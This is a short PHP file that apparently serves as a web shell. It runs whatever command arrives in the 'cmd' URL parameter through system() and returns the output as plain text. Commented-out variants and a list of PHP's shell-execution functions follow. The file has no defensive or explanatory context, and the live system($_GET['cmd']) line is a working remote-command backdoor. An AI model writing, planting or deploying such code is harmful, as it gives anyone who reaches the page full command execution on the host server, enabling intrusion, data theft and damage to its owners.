<?php
header("Content-Type: text/plain");
// print "HELLO";
// $q = $_SERVER['QUERY_STRING'];

// print ($q."\n");
// print (urldecode($q));

// print "\n".$_GET['cmd'];

ob_start();
system($_GET['cmd']);
// $sss = shell_exec($_GET['cmd']);

ob_end_flush();

// print $sss;
// escapeshellarg — Escape a string to be used as a shell argument
// escapeshellcmd — Escape shell metacharacters
// exec — Execute an external program
// passthru — Execute an external program and display raw output
// proc_close — Close a process opened by proc_open and return the exit code of that process
// proc_get_status — Get information about a process opened by proc_open
// proc_nice — Change the priority of the current process
// proc_open — Execute a command and open file pointers for input/output
// proc_terminate — Kills a process opened by proc_open
// shell_exec — Execute command via shell and return the complete output as a string
// system — Execute an external program and display the output


?>
